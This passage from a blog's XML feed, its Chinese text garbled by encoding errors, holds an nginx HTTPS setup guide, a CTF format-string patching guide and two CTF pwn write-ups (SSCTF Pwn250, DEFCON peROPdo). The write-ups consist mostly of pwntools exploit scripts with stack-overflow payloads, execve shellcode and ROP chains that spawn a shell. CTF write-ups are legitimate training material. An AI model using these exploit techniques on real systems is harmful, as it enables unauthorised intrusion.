è½½SSLæ”¯æŒçš„Nginx å¹¶ä½¿ç”¨ä¸Šè¿°ç§é’¥æ—¶é™¤å»å¿…é¡»çš„å£ä»¤ï¼š</p><p>$ cp server.key server.key.org<br>$ openssl rsa -in server.key.org -out server.key<br>é…ç½®nginx</p><p>æœ€åæ ‡è®°è¯ä¹¦ä½¿ç”¨ä¸Šè¿°ç§é’¥å’ŒCSRï¼š</p><p>$ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt<br>ä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ï¼Œè®©å…¶åŒ…å«æ–°æ ‡è®°çš„è¯ä¹¦å’Œç§é’¥ï¼š</p><p>server {<br>    server_name YOUR_DOMAINNAME_HERE;<br>    listen 443;<br>    ssl on;<br>    ssl_certificate /usr/local/nginx/conf/server.crt;<br>    ssl_certificate_key /usr/local/nginx/conf/server.key;<br>}<br>é‡å¯nginxã€‚<br>è¿™æ ·å°±å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®ï¼š</p><p>è¿™é‡Œè´´å‡ºæˆ‘ `https.confâ€™çš„é…ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">                listen <span class="number">443</span>;</span><br><span class="line">                ssl on;</span><br><span class="line">                ssl_certificate /etc/nginx/ssl/ctfrank/ctfrank.crt;</span><br><span class="line">                ssl_certificate_key /etc/nginx/ssl/ctfrank/ctfrank.key;</span><br><span class="line">                ssl_session_timeout <span class="number">5</span>m;</span><br><span class="line">                server_name www.ctfrank.org ctfrank.org;</span><br><span class="line">                <span class="comment">#if ($ssl_protocol = &quot;&quot;) &#123;rewrite ^ https://$server_name$request_uri? permanent;&#125;</span></span><br><span class="line">                add_header Strict-Transport-Security <span class="string">&quot;max-age=3650000&quot;</span>;</span><br><span class="line">                add_header X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">                add_header X-Content-Type-Options nosniff;</span><br><span class="line">                add_header X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line"></span><br><span class="line">                location /admin/ &#123;</span><br><span class="line">                        proxy_pass http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/;</span><br><span class="line">                        <span class="comment">#proxy_set_header Host $host;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span></span><br><span class="line">                        <span class="comment">#proxy_set_header X-Forwarded-Proto  $scheme;</span></span><br><span class="line">                &#125;</span><br><span class="line">                location / &#123;</span><br><span class="line">                         proxy_pass http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">                listen <span class="number">80</span>;</span><br><span class="line">                server_name www.ctfrank.org ctfrank.org;</span><br><span class="line">                rewrite ^(/.*) https://$server_name$<span class="number">1</span> permanent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>nginxå°±åªç›‘å¬2ä¸ªç«¯å£ï¼Œ80å’Œ443ï¼Œè€Œ80çš„è¯ï¼Œæ„æ€å°±æ˜¯åªè¦ä½ è®¿é—®80ï¼Œæˆ‘å…¨ç»™ä½ rewriteæˆhttpsï¼Œç”¨æˆ·å°±ä¼šè‡ªå·±è·³è½¬å»è®¿é—®443</p><p>443çš„å†…å®¹ï¼Œæ ¹æ®è®¿é—®çš„å†…å®¹ï¼Œæ¯”å¦‚/å°±å»è®¿é—®æœ¬åœ°8080ç«¯å£ï¼Œadminå°±å»è®¿é—®æœ¬åœ°8888ç«¯å£</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ€ä¹ˆå»patchæ ¼å¼åŒ–ä¸²æ¼æ´çš„ç¨‹åº</title>
      <link href="How-to-patch-fmt.html"/>
      <url>How-to-patch-fmt.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>CTF ä¸­Patch æ ¼å¼åŒ–å­—ç¬¦ä¸²ç®€ä¾¿çš„æ–¹æ³•</p><h1 id="æ–¹æ³•-â€”â€“-gt-æ›¿æ¢printf-ä¸ºputs"><a href="#æ–¹æ³•-â€”â€“-gt-æ›¿æ¢printf-ä¸ºputs" class="headerlink" title="æ–¹æ³• â€”â€“&gt; æ›¿æ¢printf ä¸ºputs"></a>æ–¹æ³• â€”â€“&gt; æ›¿æ¢printf ä¸ºputs</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-01.jpg"></a></p><h2 id="0x1-ç¡®å®šè®¡ç®—æ–¹æ³•"><a href="#0x1-ç¡®å®šè®¡ç®—æ–¹æ³•" class="headerlink" title="0x1 ç¡®å®šè®¡ç®—æ–¹æ³•"></a>0x1 ç¡®å®šè®¡ç®—æ–¹æ³•</h2><p>ç”±äºåœ°å€æ˜¯ç›¸å¯¹çš„ æ‰€ä»¥</p><p><code>æ–°åœ°å€ = ç›®æ ‡åœ°å€ï¼ˆè¿™é‡Œå³ä¸º putsçš„pltåœ°å€ï¼‰ - å½“å‰ä¿®æ”¹æŒ‡ä»¤åœ°å€çš„ä¸‹ä¸€æŒ‡ä»¤åœ°å€</code></p><h2 id="0x02-ç¡®å®šç›®æ ‡åœ°å€"><a href="#0x02-ç¡®å®šç›®æ ‡åœ°å€" class="headerlink" title="0x02 ç¡®å®šç›®æ ‡åœ°å€"></a>0x02 ç¡®å®šç›®æ ‡åœ°å€</h2><p>åœ¨plt æ®µ å¯ä»¥çœ‹åˆ° puts_plt åœ°å€ä¸º 0x08048410</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-02.jpg"></a></p><h2 id="0x03-ç¡®å®šå½“å‰åœ°å€"><a href="#0x03-ç¡®å®šå½“å‰åœ°å€" class="headerlink" title="0x03 ç¡®å®šå½“å‰åœ°å€"></a>0x03 ç¡®å®šå½“å‰åœ°å€</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-03.jpg"></a></p><p>å½“å‰æŒ‡ä»¤ <code>call _printf</code>çš„åœ°å€ä¸º 0x08048618  ä¸‹ä¸€æŒ‡ä»¤åœ°å€ä¸º 0x0804861D</p><h2 id="0x04-è®¡ç®—"><a href="#0x04-è®¡ç®—" class="headerlink" title="0x04 è®¡ç®—"></a>0x04 è®¡ç®—</h2><p>è®¡ç®—ç»“æœ å¦‚æœä¸ºè´Ÿæ•° è®°å¾—è¡¥ç ~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>puts_plt = <span class="number">0x8048410</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>call_net_addr = <span class="number">0x0804861d</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>offset = puts_plt - call_next_addr</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>offset</span><br><span class="line"><span class="number">-525</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(offset)</span><br><span class="line"><span class="string">&#x27;-0x20d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0xffffffff</span><span class="number">-0x20d</span>+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0xfffffdf3L&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-ä¿®æ”¹"><a href="#0x05-ä¿®æ”¹" class="headerlink" title="0x05 ä¿®æ”¹"></a>0x05 ä¿®æ”¹</h2><p>Edit â€“&gt; Patch Program â€“&gt; Change Byte </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-04.jpg"></a></p><p>E8 æ˜¯æ“ä½œç   åå››ä½æ˜¯åç§» å³  åˆå› ä¸ºé«˜å­—èŠ‚åœ¨åé¢~ </p><p><a href="http://oayoilchh.bkt.clouddn.com/17-5-25/54216390.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-5-25/54216390.jpg"></a></p><p><code>E8 C3 FD FF FF C7 04 24 72 87 04 08 E8 E7 FD FF</code></p><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹ <code>C3 FD FF FF</code>  â€”&gt; <code>F3 FD FF FF</code></p><p>ä¿®æ”¹å F5 ä¼ªä»£ç ~ </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-05.jpg"></a></p><h2 id="0x06-ä¿å­˜"><a href="#0x06-ä¿å­˜" class="headerlink" title="0x06 ä¿å­˜"></a>0x06 ä¿å­˜</h2><p>Edit â€“&gt; Patch Program â€“&gt; Apply patches to input file</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-06.png"></a></p><p>è¿è¡Œæƒ…å†µ~</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
            <tag> patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017- SSCTF-Pwn250</title>
      <link href="2017-SSCTF-Pwn.html"/>
      <url>2017-SSCTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æ¼æ´å¾ˆç®€å•ï¼Œæ ˆæº¢å‡ºï¼Œå¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png"></a></p><p>æ–¹æ³•ä¸€ï¼š     mprotect ä¼ shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">DEBUG = <span class="number">1</span> </span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./250&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;#b main&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806E070</span></span><br><span class="line">main_addr = <span class="number">0x08048886</span></span><br><span class="line">read = <span class="number">0x0806D510</span></span><br><span class="line">stack = <span class="number">0x08049000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">prop = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;82&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(mprotect)+p32(main_addr)+p32(stack)+p32(size)+p32(prop)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;90&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line">ssize = len(shellcode)</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(read)+p32(stack)+p32(<span class="number">0</span>)+p32(stack)+p32(ssize)+<span class="string">&#x27;THE END!&#x27;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;THE END!&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&#x27;send?&#x27;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02"></a></p><p>int 80 èµ·shell   by pxx</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">io</span>):</span></span><br><span class="line">    io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">dl_mk_stack_exe = <span class="number">0x080A0AF0</span></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.i386.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret</span></span><br><span class="line">add_ebx_esp = <span class="number">0x080e77dc</span></span><br><span class="line"><span class="comment">#0x080481c9 : pop ebx ; ret</span></span><br><span class="line">p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line"><span class="comment">#0x0804f2ea : mov eax, ebx ; pop ebx ; ret</span></span><br><span class="line">mov_eax_ebx_p_ret = <span class="number">0x0804f2ea</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0806cbb5 : int 0x80</span></span><br><span class="line">p_eax_ret = <span class="number">0x080b89e6</span></span><br><span class="line">p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">p_ecx_ret = <span class="number">0x080df1b9</span></span><br><span class="line">p_edx_ret = <span class="number">0x0806efbb</span></span><br><span class="line">int80_addr = <span class="number">0x0806cbb5</span></span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806D510</span></span><br><span class="line">bss_addr = <span class="number">0x080ece00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x3a</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += gen_rop_data(read_addr, [<span class="number">0</span>, bss_addr, <span class="number">8</span>])</span><br><span class="line">payload += l32(p_eax_ret)</span><br><span class="line">payload += l32(<span class="number">0xb</span>)</span><br><span class="line">payload += l32(p_ebx_ret)</span><br><span class="line">payload += l32(bss_addr)</span><br><span class="line">payload += l32(p_ecx_ret)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(p_edx_ret)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(int80_addr)</span><br><span class="line"></span><br><span class="line">io.writeline(str(<span class="number">1000</span>))</span><br><span class="line">io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint()</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interact()</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SSTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 DEFCON ---  peROPdo writeup</title>
      <link href="2017-defcon-peROPdo.html"/>
      <url>2017-defcon-peROPdo.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./peropdo&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me&quot;</span>,<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span>():</span></span><br><span class="line">    gdb.attach(r,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x08048FD0</span></span><br><span class="line"><span class="string">    b *0x08048B4F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    raw_input(<span class="string">&quot;debug&quot;</span>)<span class="comment">#0x1022</span></span><br><span class="line">    <span class="comment">#cat /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#å¼€å¯echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#å…³é—­echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#C-b o åœ¨å°çª—å£ä¸­åˆ‡æ¢</span></span><br><span class="line">    <span class="comment">#http://blog.chinaunix.net/uid-26285146-id-3252286.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line"></span><br><span class="line">int_0x80 = <span class="number">0x08049551</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80e3525</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804b1c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080e5ee1</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806f2fa</span></span><br><span class="line">name_addr = <span class="number">0x080ECFC0</span></span><br><span class="line">sub_eax_1_pop_ebx_ret = <span class="number">0x08054cfa</span></span><br><span class="line"></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806f320</span></span><br><span class="line">srop = <span class="number">0x807c069</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">seed = p32(<span class="number">0xea9ad2fe</span>)</span><br><span class="line">name = seed</span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*<span class="number">10</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*(<span class="number">10</span><span class="number">-4</span>)</span><br><span class="line">name += <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*(<span class="number">52</span><span class="number">-20</span><span class="number">-7</span>)</span><br><span class="line">name += p32(pop_eax_ret)</span><br><span class="line">name += p32(<span class="number">0x0e</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(pop_ecx_ret)<span class="comment">#0x0</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">10</span>)</span><br><span class="line">name += p32(pop_edx_ret)<span class="comment">#0x0</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span>)</span><br><span class="line">name += p32(int_0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(name)</span><br><span class="line">r.recvuntil(<span class="string">&quot;roll?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;23&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;again?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> DEFCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 360æ˜¥ç§‹æ¯çº¿ä¸Š éƒ¨åˆ†Pwn writeup</title>
      <link href="2017-360chunqiu-online.html"/>
      <url>2017-360chunqiu-online.html</url>
      
